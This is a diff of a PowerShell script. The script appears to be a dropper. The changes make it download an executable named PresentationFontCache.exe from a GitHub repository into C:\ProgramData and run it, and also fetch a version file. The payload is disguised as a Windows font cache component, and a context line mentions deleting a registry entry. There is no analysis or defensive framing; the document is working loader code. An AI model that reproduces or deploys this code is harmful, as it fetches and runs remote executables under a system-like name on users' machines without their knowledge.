@@ -23,19 +23,27 @@ if ($version -eq (Invoke-WebRequest -Uri $url_text -UseBasicParsing).Content) {
     } else {
         # Download exe file
         $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
+        $file = "C:\ProgramData\PresentationFontCache.exe"
+        $down = New-Object System.Net.WebClient
         $down.DownloadFile($url,$file)
         # Run the exe file
         $exec = New-Object -com shell.application
         $exec.shellexecute($file)
-    }
+        }
 } else {
     # Version change, download the new exe file
     $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
     $file = "C:\ProgramData\PresentationFontCache.exe"
+    $down = New-Object System.Net.WebClient
     $down.DownloadFile($url,$file)
     # Run the exe file
     $exec = New-Object -com shell.application
     $exec.shellexecute($file)
+    $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
+    $file_text = "C:\ProgramData\version.txt"
+    # Download version.txt
+    $down = New-Object System.Net.WebClient
+    $down.DownloadFile($url_text,$file_text)
 }
 
 # Delete registry entry
